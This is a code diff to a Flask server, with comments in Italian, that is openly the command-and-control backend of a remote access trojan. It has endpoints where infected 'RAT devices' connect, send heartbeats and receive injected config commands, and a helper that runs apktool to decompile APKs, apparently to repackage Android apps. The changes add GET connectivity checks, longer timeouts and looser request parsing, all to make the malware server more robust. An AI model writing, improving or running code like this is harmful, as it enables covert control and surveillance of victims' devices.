@@ -48,14 +48,23 @@ def get_user_folder(base_folder, username):
     os.makedirs(folder, exist_ok=True)
     return folder
 
-def run_cmd(username, cmd):
-    """Run a command and return its output"""
+def run_cmd(username, cmd, timeout=300):
+    """Run a command and return its output with a configurable timeout"""
     log_cmd(username, cmd)
-    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
-    if result.returncode != 0:
-        log_cmd(username, f"Command failed with code {result.returncode}: {result.stderr}")
-        raise Exception(f"Command failed: {result.stderr}")
-    return result.stdout
+    
+    # Aumenta il timeout per i comandi apktool su file grandi
+    if cmd.startswith("apktool d"):
+        timeout = 1800  # 30 minuti per decompilare APK grandi
+    
+    try:
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
+        if result.returncode != 0:
+            log_cmd(username, f"Command failed with code {result.returncode}: {result.stderr}")
+            raise Exception(f"Command failed: {result.stderr}")
+        return result.stdout
+    except subprocess.TimeoutExpired:
+        log_cmd(username, f"Command timed out after {timeout} seconds: {cmd}")
+        raise Exception(f"Timeout occurred for command: {cmd}")
 
 def log_cmd(username, message):
     """Log a command to the user's log"""
@@ -201,19 +210,41 @@ CURRENT_FLASK_PORT = FLASK_WEB_PORT
 active_rat_connections = {}  # device_id -> socket connection
 
 # Socket connection endpoint for RAT devices
-@app.route("/api/rat_connect", methods=["POST", "OPTIONS"])
+@app.route("/api/rat_connect", methods=["POST", "GET", "OPTIONS"])
 def rat_connect():
     """Handle RAT device socket-style connections via HTTP"""
     # Gestisci le richieste OPTIONS per CORS
     if request.method == "OPTIONS":
         return jsonify({"status": "ok"}), 200
+    
+    # Gestisci le richieste GET per test di connettività
+    if request.method == "GET":
+        return jsonify({
+            "status": "ok", 
+            "message": "RAT server is running", 
+            "timestamp": int(time.time())
+        }), 200
         
     # Gestisci le richieste POST normali
     try:
-        data = request.json
-        if not data:
-            # Se non ci sono dati JSON, prova a leggere i dati form
+        # Prova a ottenere i dati in diversi formati
+        data = None
+        if request.is_json:
+            data = request.json
+        elif request.form:
             data = request.form.to_dict()
+        elif request.data:
+            try:
+                data = json.loads(request.data.decode('utf-8'))
+            except:
+                pass
+        
+        if not data:
+            # Fallback per richieste senza dati
+            return jsonify({
+                "status": "error", 
+                "message": "No data received. Please send device_id in your request."
+            }), 400
             
         device_id = data.get('device_id')
         device_type = data.get('device_type', 'unknown')
@@ -1057,17 +1088,35 @@ def inject_config():
     append_flask_log(username, f"Config command '{config_command}' added to queue for device '{target_device_id}'.")
     return jsonify({"status":"ok", "message": f"Config command queued for device '{target_device_id}'."})
 
-@app.route("/api/heartbeat/<device_id>", methods=["POST", "OPTIONS"])
+@app.route("/api/heartbeat/<device_id>", methods=["POST", "GET", "OPTIONS"])
 def api_heartbeat_client(device_id):
     # Gestisci le richieste OPTIONS per CORS
     if request.method == "OPTIONS":
         return jsonify({"status": "ok"}), 200
+    
+    # Gestisci le richieste GET per test di connettività
+    if request.method == "GET":
+        return jsonify({
+            "status": "ok", 
+            "message": "Heartbeat endpoint is running", 
+            "timestamp": int(time.time())
+        }), 200
         
     try:
-        data = request.json
-        if not data:
-            # Se non ci sono dati JSON, prova a leggere i dati form
+        # Prova a ottenere i dati in diversi formati
+        data = None
+        if request.is_json:
+            data = request.json
+        elif request.form:
             data = request.form.to_dict()
+        elif request.data:
+            try:
+                data = json.loads(request.data.decode('utf-8'))
+            except:
+                pass
+        
+        if not data:
+            data = {}
             
         device_type = data.get("device_type", "unknown")
         rat_version = data.get("rat_version", "unknown")
